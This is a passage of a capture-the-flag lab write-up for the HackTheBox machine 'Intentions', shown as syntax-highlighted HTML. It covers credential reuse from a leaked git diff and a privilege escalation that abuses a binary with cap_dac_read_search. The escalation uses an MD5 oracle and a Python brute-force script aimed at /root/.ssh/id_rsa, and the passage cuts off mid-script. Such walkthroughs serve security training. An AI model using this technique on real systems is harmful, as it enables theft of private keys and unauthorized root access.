+<span class="n">Author</span><span class="p">:</span><span class="w"> </span><span class="n">greg</span><span class="w"> </span><span class="o">&lt;</span><span class="n">greg</span><span class="err">@</span><span class="n">intentions</span><span class="o">.</span><span class="n">htb</span><span class="o">&gt;</span>
+<span class="n">Date</span><span class="p">:</span><span class="w">   </span><span class="n">Thu</span><span class="w"> </span><span class="n">Jan</span><span class="w"> </span><span class="mi">26</span><span class="w"> </span><span class="mi">09</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">52</span><span class="w"> </span><span class="mi">2023</span><span class="w"> </span><span class="o">+</span><span class="mi">0100</span>
+
+<span class="w">    </span><span class="n">Test</span><span class="w"> </span><span class="n">cases</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">work</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">steve</span><span class="s1">'s local database, switching to user factory per his advice</span>
+
+<span class="n">diff</span><span class="w"> </span><span class="o">--</span><span class="n">git</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">tests</span><span class="o">/</span><span class="n">Feature</span><span class="o">/</span><span class="n">Helper</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">tests</span><span class="o">/</span><span class="n">Feature</span><span class="o">/</span><span class="n">Helper</span><span class="o">.</span><span class="n">php</span>
+<span class="n">index</span><span class="w"> </span><span class="n">f57e37b</span><span class="o">..</span><span class="mi">0586</span><span class="n">d51</span><span class="w"> </span><span class="mi">100644</span>
+<span class="o">---</span><span class="w"> </span><span class="n">a</span><span class="o">/</span><span class="n">tests</span><span class="o">/</span><span class="n">Feature</span><span class="o">/</span><span class="n">Helper</span><span class="o">.</span><span class="n">php</span>
+<span class="o">+++</span><span class="w"> </span><span class="n">b</span><span class="o">/</span><span class="n">tests</span><span class="o">/</span><span class="n">Feature</span><span class="o">/</span><span class="n">Helper</span><span class="o">.</span><span class="n">php</span>
+<span class="err">@@</span><span class="w"> </span><span class="o">-</span><span class="mi">8</span><span class="p">,</span><span class="mi">12</span><span class="w"> </span><span class="o">+</span><span class="mi">8</span><span class="p">,</span><span class="mi">14</span><span class="w"> </span><span class="err">@@</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">Helper</span><span class="w"> </span><span class="k">extends</span><span class="w"> </span><span class="n">TestCase</span>
+<span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">function</span><span class="w"> </span><span class="n">getToken</span><span class="p">(</span><span class="o">$</span><span class="n">test</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">admin</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="bp">false</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">         </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">admin</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="o">-</span><span class="w">            </span><span class="o">$</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">test</span><span class="o">-&gt;</span><span class="n">postJson</span><span class="p">(</span><span class="s1">'/api/v1/auth/login'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s1">'email'</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">'greg@intentions.htb'</span><span class="p">,</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">'Gr3g1sTh3B3stDev3l0per!1998!'</span><span class="p">]);</span>
+<span class="o">-</span><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">headers</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">'Authorization'</span><span class="p">);</span>
+<span class="o">+</span><span class="w">            </span><span class="o">$</span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">User</span><span class="p">::</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">admin</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">create</span><span class="p">();</span>
+<span class="w">         </span><span class="p">}</span><span class="w"> </span>
+<span class="w">         </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="o">-</span><span class="w">            </span><span class="o">$</span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">test</span><span class="o">-&gt;</span><span class="n">postJson</span><span class="p">(</span><span class="s1">'/api/v1/auth/login'</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s1">'email'</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">'greg_user@intentions.htb'</span><span class="p">,</span><span class="w"> </span><span class="s1">'password'</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="s1">'Gr3g1sTh3B3stDev3l0per!1998!'</span><span class="p">]);</span>
+<span class="o">-</span><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">res</span><span class="o">-&gt;</span><span class="n">headers</span><span class="o">-&gt;</span><span class="n">get</span><span class="p">(</span><span class="s1">'Authorization'</span><span class="p">);</span>
+<span class="o">+</span><span class="w">            </span><span class="o">$</span><span class="n">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">User</span><span class="p">::</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">create</span><span class="p">();</span>
+<span class="w">         </span><span class="p">}</span>
+<span class="o">+</span><span class="w">        </span>
+<span class="o">+</span><span class="w">        </span><span class="o">$</span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Auth</span><span class="p">::</span><span class="n">login</span><span class="p">(</span><span class="o">$</span><span class="n">user</span><span class="p">);</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+I've uncovered the password <code>Gr3g1sTh3B3stDev3l0per!1998!</code> and I'm going to attempt to use it to access the system as the <code>greg</code> user<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">www</span><span class="o">-</span><span class="k">data</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">su</span><span class="w"> </span><span class="n">greg</span>
+<span class="nl">Password</span><span class="p">:</span><span class="w"> </span>
+<span class="err">$</span><span class="w"> </span><span class="n">whoami</span>
+<span class="n">greg</span>
+<span class="err">$</span><span class="w"> </span><span class="n">bash</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+It worked, and now we are <code>greg</code>.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+Upon examining our group memberships, it becomes apparent that we are a part of the <code>scanner</code> group:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">greg</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">greg</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">greg</span><span class="p">),</span><span class="mi">1003</span><span class="p">(</span><span class="n">scanner</span><span class="p">)</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+While searching for files owned by the <code>scanner</code> group, we have come across the following:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="k">group</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+When running the script, it displays a help panel:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span>
+<span class="n">The</span><span class="w"> </span><span class="n">copyright_scanner</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="n">provides</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">capability</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">evaluate</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">single</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">blacklist</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="n">matches</span><span class="p">.</span>
+
+<span class="w">    </span><span class="n">This</span><span class="w"> </span><span class="n">utility</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">developed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">help</span><span class="w"> </span><span class="n">identify</span><span class="w"> </span><span class="n">copyrighted</span><span class="w"> </span><span class="n">material</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="n">previously</span><span class="w"> </span><span class="n">been</span><span class="w"> </span><span class="n">submitted</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">platform</span><span class="p">.</span>
+<span class="w">    </span><span class="n">This</span><span class="w"> </span><span class="n">tool</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">also</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">duplicate</span><span class="w"> </span><span class="n">images</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">avoid</span><span class="w"> </span><span class="k">having</span><span class="w"> </span><span class="n">multiple</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="n">photos</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">gallery</span><span class="p">.</span>
+<span class="w">    </span><span class="k">File</span><span class="w"> </span><span class="n">matching</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">evaluated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">comparing</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">MD5</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">portion</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">those</span><span class="w"> </span><span class="n">submitted</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="k">file</span><span class="p">.</span>
+
+<span class="w">    </span><span class="n">The</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="n">blacklist</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">maintained</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">single</span><span class="w"> </span><span class="nl">LABEL</span><span class="p">:</span><span class="n">MD5</span><span class="w"> </span><span class="n">per</span><span class="w"> </span><span class="n">line</span><span class="p">.</span>
+<span class="w">    </span><span class="n">Please</span><span class="w"> </span><span class="n">avoid</span><span class="w"> </span><span class="k">using</span><span class="w"> </span><span class="n">extra</span><span class="w"> </span><span class="n">colons</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">label</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">currently</span><span class="w"> </span><span class="n">supported</span><span class="p">.</span>
+
+<span class="w">    </span><span class="n">Expected</span><span class="w"> </span><span class="k">output</span><span class="err">:</span>
+<span class="w">    </span><span class="mf">1.</span><span class="w"> </span><span class="n">Empty</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="k">found</span>
+<span class="w">    </span><span class="mf">2.</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">every</span><span class="w"> </span><span class="k">match</span><span class="p">,</span><span class="w"> </span><span class="nl">example</span><span class="p">:</span>
+<span class="w">        </span><span class="o">[</span><span class="n">+</span><span class="o">]</span><span class="w"> </span><span class="err">{</span><span class="n">LABEL</span><span class="err">}</span><span class="w"> </span><span class="n">matches</span><span class="w"> </span><span class="err">{</span><span class="k">FILE</span><span class="err">}</span>
+
+<span class="w">  </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="n">string</span>
+<span class="w">        </span><span class="k">Path</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nc">image</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">check</span><span class="p">.</span><span class="w"> </span><span class="n">Cannot</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">combined</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">d</span>
+<span class="w">  </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">string</span>
+<span class="w">        </span><span class="k">Path</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="nc">image</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">check</span><span class="p">.</span><span class="w"> </span><span class="n">Cannot</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">combined</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">c</span>
+<span class="w">  </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="n">string</span>
+<span class="w">        </span><span class="k">Path</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">colon</span><span class="w"> </span><span class="n">separated</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="k">file</span><span class="p">.</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="n">compatible</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>
+<span class="w">  </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="nc">int</span>
+<span class="w">        </span><span class="n">Maximum</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">being</span><span class="w"> </span><span class="n">checked</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">hash</span><span class="p">.</span><span class="w"> </span><span class="n">Files</span><span class="w"> </span><span class="n">smaller</span><span class="w"> </span><span class="k">than</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">value</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">fully</span><span class="w"> </span><span class="n">hashed</span><span class="p">.</span><span class="w"> </span><span class="n">Smaller</span><span class="w"> </span><span class="k">values</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">much</span><span class="w"> </span><span class="n">faster</span><span class="w"> </span><span class="n">but</span><span class="w"> </span><span class="n">prone</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">false</span><span class="w"> </span><span class="n">positives</span><span class="p">.</span><span class="w"> </span><span class="p">(</span><span class="k">default</span><span class="w"> </span><span class="mi">500</span><span class="p">)</span>
+<span class="w">  </span><span class="o">-</span><span class="n">p</span><span class="w">    </span><span class="o">[</span><span class="n">Debug</span><span class="o">]</span><span class="w"> </span><span class="k">Print</span><span class="w"> </span><span class="n">calculated</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">hash</span><span class="p">.</span><span class="w"> </span><span class="k">Only</span><span class="w"> </span><span class="n">compatible</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">c</span>
+<span class="w">  </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">string</span>
+<span class="w">        </span><span class="k">Specific</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">check</span><span class="w"> </span><span class="n">against</span><span class="p">.</span><span class="w"> </span><span class="ow">Not</span><span class="w"> </span><span class="n">compatible</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="o">-</span><span class="n">h</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+While listing the capabilities, we observe that the binary <code>/opt/scanner/scanner</code> has the capability to read files from the system regardless of the user's privileges who runs it.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="n">getcap</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="k">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">mtr</span><span class="o">-</span><span class="n">packet</span><span class="w"> </span><span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">ping</span><span class="w"> </span><span class="n">cap_net_raw</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">gstreamer1</span><span class="mf">.0</span><span class="o">/</span><span class="n">gstreamer</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">gst</span><span class="o">-</span><span class="n">ptp</span><span class="o">-</span><span class="n">helper</span><span class="w"> </span><span class="n">cap_net_bind_service</span><span class="p">,</span><span class="n">cap_net_admin</span><span class="o">=</span><span class="n">ep</span>
+<span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span><span class="w"> </span><span class="n">cap_dac_read_search</span><span class="o">=</span><span class="n">ep</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Following certain tests, we can highlight the following about the <code>scanner</code> binary. Firstly, it has the ability to read files irrespective of the user's access privileges. Additionally, by specifying boundaries, we can read characters from specific files in MD5 format.<br/><br/>
+For instance, let's consider the file <code>/etc/passwd</code>. The first character of this file is <code>r</code> (for <code>root</code>). If we attempt to list the first character of the <code>/etc/passwd</code> file in MD5 format using <code>scanner</code>, it would look something like this:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">elswix</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span>
+<span class="o">[</span><span class="n">DEBUG</span><span class="o">]</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="mi">4</span><span class="n">b43b0aee35624cd95b910189b3dc231</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, let's verify if it has indeed converted the first character of the <code>/etc/passwd</code> file into MD5 format (remember, it should be <code>r</code>):<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="s1">'r'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">md5sum</span>
+<span class="mi">4</span><span class="n">b43b0aee35624cd95b910189b3dc231</span><span class="w">  </span><span class="o">-</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Both hashes match, indicating that it's functioning correctly.<br/><br/>
+Let's provide a brief explanation of what we did when running the binary:<br/><br/>
+<ul>
+<li>
+<code>-l 1</code>: We specified the maximum number of characters to be hashed in MD5 format from the file we designate. In our case, we instructed it to hash just one character.<br/><br/>
+</li>
+<li>
+<code>-s elswix</code>: This would alert us if the result were <code>elswix</code>, although it will never occur.<br/><br/>
+</li>
+<li>
+<code>-p</code>: It displays what's happening in the background, allowing us to see on the screen the hash it obtained after hashing the characters.<br/><br/>
+</li>
+<li>
+<code>-c /etc/passwd</code>: We specified that we want to read the <code>/etc/passwd</code> file.<br/><br/>
+</li>
+</ul>
+If we were to request it to hash the first 4 characters of the <code>/etc/passwd</code> file, it would return the following:"<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">scanner</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="n">elswix</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span>
+<span class="o">[</span><span class="n">DEBUG</span><span class="o">]</span><span class="w"> </span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">hash</span><span class="w"> </span><span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span>
+<span class="n">greg</span><span class="nv">@intentions</span><span class="err">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">$</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+This hash should correspond to the <code>root</code> string in MD5 format. We can verify it using <code>md5sum</code>:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="ss">"root"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">md5sum</span>
+<span class="mi">63</span><span class="n">a9f0ea7bb98050796b649e85481845</span><span class="w">  </span><span class="o">-</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+We are indeed correct, and everything is functioning as expected. Given that we can specify the file we want it to read, we could attempt to specify the file <code>/root/.ssh/id_rsa</code>. Successfully reading this file would grant us access to the system as the <code>root</code> user.<br/><br/>
+To avoid having to check each character manually and sum them, I will create a Python script:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3 </span>
+
+<span class="kn">import</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">pdb</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">subprocess</span>
+
+<span class="k">def</span> <span class="nf">checkhash</span><span class="p">(</span><span class="n">hashChr</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+
+    <span class="c1">#characters = "abcdef0123456789"</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+        <span class="n">char</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">((</span><span class="n">content</span> <span class="o">+</span> <span class="n">char</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="n">hashChr</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">char</span> 
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="n">content</span> <span class="o">=</span> <span class="s2">""</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span> 
+    <span class="n">fileToRead</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">hashChr</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="sa">f</span><span class="s2">"/opt/scanner/scanner -l </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2"> -s elswix -c </span><span class="si">{</span><span class="n">fileToRead</span><span class="si">}</span><span class="s2"> -p"</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+        <span class="n">arr</span> <span class="o">=</span> <span class="n">hashChr</span><span class="o">.</span><span class="n">split</span><span class="p">()</span> 
+        <span class="n">hashChr</span> <span class="o">=</span> <span class="n">arr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">checkhash</span><span class="p">(</span><span class="n">hashChr</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">ret</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+            <span class="k">break</span> 
+        <span class="n">content</span> <span class="o">+=</span> <span class="n">ret</span> 
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+
+    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"output.txt"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+
+
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Usage: python3 </span><span class="si">%s</span><span class="s2"> &lt;file&gt;</span><span class="se">\n</span><span class="s2">"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
